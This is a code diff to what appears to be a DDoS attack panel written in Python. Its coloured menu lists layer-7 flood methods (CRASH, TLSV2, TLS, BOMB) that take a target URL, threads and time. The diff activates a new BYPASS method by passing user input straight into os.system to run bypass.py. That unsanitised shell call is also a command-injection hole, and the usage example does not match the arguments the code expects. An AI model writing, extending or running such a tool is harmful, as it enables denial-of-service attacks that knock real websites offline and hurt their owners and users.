@@ -57,7 +57,7 @@ def layer7():
 \033[95m           - CRASH [\033[92mURL\033[95m] [\033[92mGET\033[95m]
 \033[95m           - TLSV2 [\033[92mURL\033[95m] [\033[92mGET\033[95m]
 \033[95m           - TLS   [\033[92mURL\033[95m] [\033[92mTIME\033[95m] [\033[92mRATE\033[95m] [\033[92mTHREAD\033[95m]
-\033[95m           - BYPASS [\033[92mcoming soon\033[95m]
+\033[95m           - BYPASS [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 \033[95m           - BOMB [\033[92mURL\033[95m] [\033[92mTHREAD\033[95m] [\033[92mTIME\033[95m]
 
 \033[96m         ╚════════════════════════════════════════════════════════╝
@@ -164,6 +164,17 @@ def main():
                 print('\n')
                 print('Usage: CRASH <url> METHODS<GET/POST>')
                 print('Example: CRASH http://example.com GET')
+                print('\n')
+
+        elif "BYPASS" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'python bypass.py -site {url} -data {method}')
+            except IndexError:
+                print('\n')
+                print('Usage: BYPASS <url> METHODS<GET/POST>')
+                print('Example: BYPASS http://example.com 1500 200')
                 print('\n')
 
         elif "TLSV2" in cnc:
